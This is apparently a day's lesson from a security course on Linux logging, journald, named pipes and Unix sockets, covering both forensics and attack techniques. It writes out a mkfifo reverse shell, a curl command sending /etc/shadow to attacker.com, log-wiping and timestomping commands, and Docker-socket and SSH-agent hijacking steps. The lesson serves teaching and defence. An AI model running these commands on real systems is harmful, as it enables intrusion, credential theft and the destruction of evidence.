---
title: "Logs, Named Pipes, and Unix Sockets"
tags: [foundation, linux, logging, journald, syslog, mkfifo, unix-sockets,
       attacker-artefacts, forensics, post-exploitation, log-tampering]
module: 01-Foundation-02
day: 13
related_topics:
  - Linux Processes, Networking CLI and Bash (Day 010)
  - Digital Forensics — Timeline Reconstruction (Day 198)
  - Incident Response Playbooks (Day 218)
  - Attacker Artefacts and Anti-Forensics (Day 243)
---

# Day 013 — Logs, Named Pipes, and Unix Sockets

## Goals

By the end of this lesson you will be able to:

1. Locate and read the key Linux log files that matter for security.
2. Query `journald` with `journalctl` and extract security-relevant events.
3. Identify what artefacts an attacker leaves behind in logs and where.
4. Understand named pipes (`mkfifo`) — what they are and how they are abused
   for covert communication.
5. Understand Unix domain sockets — how processes use them, and how an
   attacker can interact with or hijack them.
6. Describe three log-tampering techniques and their forensic countermeasures.

---

## Prerequisites

- [Day 009 — Linux Filesystem, Permissions and Users](DAY-0009-Linux-Filesystem-Permissions-and-Users.md)
- [Day 010 — Linux Processes, Networking CLI and Bash](DAY-0010-Linux-Processes-Networking-and-Bash.md)

---

## Main Content — Part 1: Linux Logging

### 1. The Two Logging Systems

Modern Linux distributions run two parallel logging systems:

| System | Daemon | Storage | Format |
|---|---|---|---|
| **syslog** | `rsyslog` / `syslog-ng` | `/var/log/*.log` | Plain text |
| **journald** | `systemd-journald` | `/run/log/journal/` (volatile) or `/var/log/journal/` (persistent) | Binary |

Both coexist. `journald` captures everything systemd sees; `rsyslog` can be
configured to forward to remote syslog servers or write to files.

---

### 2. Critical Log Files — Security Perspective

```
/var/log/auth.log          (Debian/Ubuntu) — Authentication events
/var/log/secure            (RHEL/CentOS)   — Authentication events
/var/log/syslog            (Debian/Ubuntu) — General system messages
/var/log/messages          (RHEL/CentOS)   — General system messages
/var/log/kern.log          — Kernel messages (includes iptables drops, OOM)
/var/log/cron              or /var/log/cron.log — Cron job execution
/var/log/btmp              — Failed login attempts (binary — use: lastb)
/var/log/wtmp              — Login/logout history (binary — use: last)
/var/log/lastlog           — Last login per user (binary — use: lastlog)
/var/log/faillog           — Failed login counts per user
/var/log/dpkg.log          — APT package installs/removes (Debian)
/var/log/yum.log           or /var/log/dnf.log — RPM package changes
/var/log/apache2/          — Apache access and error logs
/var/log/nginx/            — Nginx access and error logs
/var/log/mysql/            — MySQL error and query logs
/var/log/audit/audit.log   — Linux Audit daemon (if installed)
```

---

### 3. Reading Authentication Logs

`/var/log/auth.log` is the most important log for detecting intrusions on
Linux. It records: SSH logins, sudo usage, su attempts, PAM events.

```bash
# All SSH events today
grep "sshd" /var/log/auth.log | grep "$(date +%b\ %e)"

# Failed SSH password attempts (brute force indicator)
grep "Failed password" /var/log/auth.log | \
    awk '{print $11}' | sort | uniq -c | sort -rn | head -20

# Successful SSH logins
grep "Accepted" /var/log/auth.log

# SSH public key auth (less noisy)
grep "Accepted publickey" /var/log/auth.log

# All sudo usage
grep "sudo" /var/log/auth.log

# Root logins
grep "session opened for user root" /var/log/auth.log

# New user creation (potential persistence)
grep "useradd\|adduser" /var/log/auth.log
```

**Sample auth.log entries and what they mean:**

```
# Successful SSH login from 1.2.3.4:
Apr 11 14:22:31 server sshd[1234]: Accepted password for alice from 1.2.3.4 port 54312 ssh2

# Failed login attempt:
Apr 11 14:22:40 server sshd[1235]: Failed password for root from 5.6.7.8 port 33221 ssh2

# SSH login for invalid user (username enumeration or spray):
Apr 11 14:22:41 server sshd[1236]: Invalid user admin from 5.6.7.8 port 33222

# sudo command execution:
Apr 11 14:25:00 server sudo: alice : TTY=pts/0 ; PWD=/home/alice ; \
    USER=root ; COMMAND=/usr/bin/cat /etc/shadow

# Authentication failure via PAM:
Apr 11 14:26:00 server su[1240]: pam_unix(su:auth): authentication failure; \
    logname=alice uid=1001 euid=0 tty=pts/1 ruser=alice rhost= user=root
```

---

### 4. journald — The Binary Log System

`journald` captures everything: kernel messages, systemd unit output,
application stdout/stderr, syslog-compatible messages.

```bash
# All logs (paged)
journalctl

# Logs for current boot only
journalctl -b

# Previous boot (useful after a reboot that followed an intrusion)
journalctl -b -1

# Follow in real time (like tail -f)
journalctl -f

# Filter by systemd unit
journalctl -u sshd
journalctl -u nginx
journalctl -u cron

# Filter by time range
journalctl --since "2026-04-11 00:00:00" --until "2026-04-11 23:59:59"
journalctl --since "1 hour ago"

# Filter by priority (0=emerg, 1=alert, 2=crit, 3=err, 4=warning, 5=notice,
#                     6=info, 7=debug)
journalctl -p err          # errors and above
journalctl -p warning      # warnings and above

# Filter by kernel messages only
journalctl -k

# Filter by a specific PID
journalctl _PID=1234

# Output as JSON (useful for log shipping / SIEM ingestion)
journalctl -u sshd --output=json-pretty | head -50

# Show disk usage of journals
journalctl --disk-usage
```

---

### 5. Attacker Artefacts in Logs

**What survives in logs after an SSH intrusion:**

| Artefact | Location | Log entry |
|---|---|---|
| Source IP of attacker | `/var/log/auth.log` | `Accepted ... from X.X.X.X` |
| Time of access | auth.log timestamps | — |
| Commands run via sudo | auth.log | `COMMAND=/path/to/cmd` |
| New accounts created | auth.log | `useradd` / `new user:` |
| Package installs | `/var/log/dpkg.log` | `install ... [new]` |
| Cron job additions | `/var/log/cron` | — |
| Kernel errors from exploit | `/var/log/kern.log` | — |

**Bash history — a goldmine:**

```bash
cat /home/*/.bash_history 2>/dev/null
cat /root/.bash_history 2>/dev/null

# Look for:
# - wget/curl with external URLs (download of tools/shells)
# - nc / ncat / socat (reverse shells)
# - python3 -c (in-memory execution)
# - chmod +s (SUID setting)
# - useradd / adduser (persistence)
# - crontab -e (scheduled persistence)
# - ssh-keygen / echo >> .ssh/authorized_keys (SSH persistence)
```

---

### 6. Log Tampering — Attacker Techniques

Sophisticated attackers attempt to cover their tracks. Know these techniques
so you can detect them.

**Technique 1 — Clear auth.log:**

```bash
# Truncate (requires write permission, usually root)
> /var/log/auth.log           # Truncate to empty
echo "" > /var/log/auth.log

# Effect: entire log is gone → suspicious in itself
# Detection: inotifywait can detect writes to log files;
#            SIEM gaps / missing log ingestion window
```

**Technique 2 — Selective line deletion:**

```bash
# Remove lines containing attacker's IP
sed -i '/5.6.7.8/d' /var/log/auth.log

# Effect: less obvious than clearing; no gap if IP is the only thing
# Detection: hash the log file periodically and alert on changes
#            (auditd with -w /var/log/auth.log -p wra)
```

**Technique 3 — Bash history suppression:**

```bash
# Disable history for the session
unset HISTFILE
export HISTSIZE=0

# Or redirect to /dev/null before doing anything
export HISTFILE=/dev/null

# Or clear it at the end
history -c
rm -f ~/.bash_history

# Detection: ~.bash_history is empty but user had a session;
#            journald / auditd will still have process events
```

**Technique 4 — Timestomping (change file mtime):**

```bash
# Change modification time to match another file
touch -r /etc/hosts /var/log/auth.log

# Or set a specific time
touch -t 202401010000 /var/log/auth.log

# Detection: ctime (inode change time) cannot be set by touch;
#            file's ctime will differ from mtime → forensic indicator
```

**Countermeasure:** Forward logs to an external SIEM/log server in real time.
Logs that leave the host immediately cannot be tampered with on the host.
This is why log aggregation (Days B-01 to B-02) is so critical.

---

## Main Content — Part 2: Named Pipes (FIFOs)

### 7. What is a Named Pipe?

A **named pipe** (also called a FIFO — First In, First Out) is a special file
type that provides a one-directional data channel between processes. Unlike
anonymous pipes (`|`), named pipes have a filesystem path and persist between
processes.

```bash
# Create a named pipe
mkfifo /tmp/my_pipe

# Verify type (p = pipe)
ls -la /tmp/my_pipe
# prw-r--r-- 1 alice alice 0 Apr 11 /tmp/my_pipe

# Write to it in background
echo "hello from the pipe" > /tmp/my_pipe &

# Read from it (blocks until data is available)
cat /tmp/my_pipe
# hello from the pipe
```

**Key property:** A write to a FIFO blocks until a reader opens it.
A read from a FIFO blocks until a writer opens it. This synchronisation
behaviour is what makes them useful — and abusable.

---

### 8. Named Pipes in Attack Scenarios

**Scenario 1 — Reverse shell relay using mkfifo:**

The classic netcat-less reverse shell on systems without a `-e` flag:

```bash
# On attacker machine: listen
nc -lvnp 4444

# On victim: create a relay using a FIFO
mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.5 4444 > /tmp/f
```

**How it works:**

1. `/tmp/f` is the FIFO.
2. `cat /tmp/f` reads from the FIFO (blocks until data arrives).
3. The data (commands from netcat) is piped to `/bin/sh`.
4. `sh`'s output (stdout + stderr) is sent to netcat.
5. netcat writes the output to the FIFO — closing the loop.

This is the core "reverse shell without a `-e` flag" technique.
Every penetration tester needs to understand this from first principles.

**Scenario 2 — Data exfiltration over HTTP using pipes:**

```bash
# Exfiltrate file contents through a FIFO to curl
mkfifo /tmp/exfil
curl -X POST http://attacker.com/collect \
    --data-binary @/tmp/exfil &
cat /etc/shadow > /tmp/exfil
```

**Scenario 3 — Covert IPC between stages of malware:**

A loader writes a payload path to a FIFO; the second stage reads it.
No network connection, no temp file with known name.

---

## Main Content — Part 3: Unix Domain Sockets

### 9. What is a Unix Domain Socket?

A **Unix domain socket** (UDS) is a socket that communicates via the
filesystem instead of TCP/IP. It is:

- Faster than TCP (no network stack overhead).
- Access-controlled by filesystem permissions.
- Used extensively by system daemons: `dockerd`, `nginx`, `mysqld`,
  `ssh-agent`, `dbus`, `systemd`.

**Types:**

| Type | Description |
|---|---|
| `SOCK_STREAM` | Bidirectional, connection-oriented (like TCP) |
| `SOCK_DGRAM` | Unidirectional, datagram-based (like UDP) |
| `SOCK_SEQPACKET` | Like STREAM but preserves message boundaries |

**Finding Unix sockets:**

```bash
# List all Unix sockets
ss -xnlp

# Or with lsof
lsof -U

# Example output:
# /run/docker.sock          — Docker daemon API
# /run/systemd/private/...  — systemd internal
# /var/run/mysqld/mysqld.sock — MySQL
# /tmp/.X11-unix/X0         — X11 display server
# /run/user/1001/gnupg/...  — GPG agent
# /tmp/ssh-XXXXXX/agent.NNN — SSH agent
```

---

### 10. Attacking Unix Sockets

**Scenario 1 — Docker socket privilege escalation:**

The Docker socket (`/run/docker.sock`) is a Unix socket. Any process that
can write to it can communicate with the Docker daemon — which runs as root.

```bash
# Check if docker.sock is readable (often group 'docker')
ls -la /run/docker.sock
# srw-rw---- 1 root docker 0 Apr 11 /run/docker.sock

# If current user is in the 'docker' group, this is root:
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# Explanation: mount the entire host filesystem into the container,
# chroot into it — full root shell on the host

# Or without the Docker CLI (using the API directly via curl):
curl --unix-socket /run/docker.sock http://localhost/containers/json
```

**docker group = root. No exceptions. It is in GTFOBins and should be
considered a privilege escalation finding in any pentest report.**

**Scenario 2 — SSH agent socket hijacking:**

SSH agent stores private keys in memory and uses a Unix socket for
communication. If an attacker can access the socket, they can use the keys.

```bash
# Find SSH agent sockets (usually in /tmp/ssh-XXXXX/)
find /tmp -name "agent.*" 2>/dev/null
ls /tmp/ssh-*/

# Check if readable
ls -la /tmp/ssh-ABCDEF/agent.1234

# If readable, use the hijacked agent:
export SSH_AUTH_SOCK=/tmp/ssh-ABCDEF/agent.1234
ssh-add -l     # List keys in the agent
ssh user@internal-server  # Use the keys without knowing the passphrase
```

**Scenario 3 — Read from MySQL socket:**

```bash
# MySQL listens on a Unix socket; if world-readable, any local user
# can connect:
mysql -u root -S /var/run/mysqld/mysqld.sock
# If root MySQL account has no password set (common in dev environments):
# instant access to all databases
```

---

## Key Takeaways

1. **`/var/log/auth.log` is the first log to check during an incident.**
   Every SSH login, sudo event, and account creation is there. An empty or
   truncated auth.log is itself a forensic indicator.
2. **`journalctl -b` for current boot; `journalctl -b -1` for the previous
   boot.** An attacker who rebooted the machine to clear volatile journald
   logs still leaves the previous boot's data if journals are persistent.
3. **Log tampering is detectable.** ctime vs mtime mismatch, SIEM log gaps,
   and `auditd` watchers on log files all catch tampering. The best defence
   is shipping logs off-host the moment they are written.
4. **`mkfifo` + netcat = reverse shell without netcat `-e` flag.** Understand
   the mechanics. You will use this when `-e` is not available (which is most
   modern systems).
5. **Unix sockets are access-controlled by filesystem permissions — and
   widely misconfigured.** Docker socket world-readable = instant root.
   SSH agent socket readable by other users = key theft without the passphrase.

---

## Exercises

### Exercise 1 — Log Analysis

On your lab machine:

1. Attempt to SSH with the wrong password three times.
2. Find those failed attempts in `/var/log/auth.log`.
3. Write a one-liner that counts failed SSH attempts per source IP from
   auth.log.
4. Use `journalctl -u sshd` to find the same events via journald.
5. Compare the timestamps — are they identical?

---

### Exercise 2 — Named Pipe Reverse Shell

In a safe lab environment (two terminals, no actual network):

1. In terminal 1: `nc -lvnp 4444`
2. In terminal 2: set up the mkfifo reverse shell targeting localhost:4444.
3. Confirm you can run commands in terminal 1 on terminal 2's system.
4. Trace the data flow: draw on paper how data moves through the FIFO.
5. What happens if you remove `/tmp/f` while the shell is active?

---

### Exercise 3 — Unix Socket Enumeration

1. Run `ss -xnlp` and list all Unix sockets on your machine.
2. For each socket, identify: what process owns it, what permissions it has,
   and whether it is a potential escalation target.
3. If Docker is installed: `ls -la /run/docker.sock`. What group owns it?
   Are you in that group?
4. Find any SSH agent sockets: `find /tmp -name "agent.*" 2>/dev/null`.

---

### Exercise 4 — Log Tampering Detection

1. Configure `auditd` to watch auth.log:

```bash
sudo auditctl -w /var/log/auth.log -p wra -k log_tamper
```

2. As root, truncate auth.log.
3. Check: `sudo ausearch -k log_tamper` — can you see the tamper event?
4. What is the process name, PID, and UID of the process that wrote to the
   log file?

---

## Questions

### Open Questions

*(none yet — add yours here)*

---

### Answered Questions

*(none yet)*

---

*Previous: [Day 012 — SUID, Sudo and Package Trust](DAY-0012-SUID-Sudo-and-Package-Trust.md)*
*Next: [Day 014 — Linux Lab: Enumeration and Hidden Files](DAY-0014-Linux-Lab-Enumeration-and-Hidden-Files.md)*
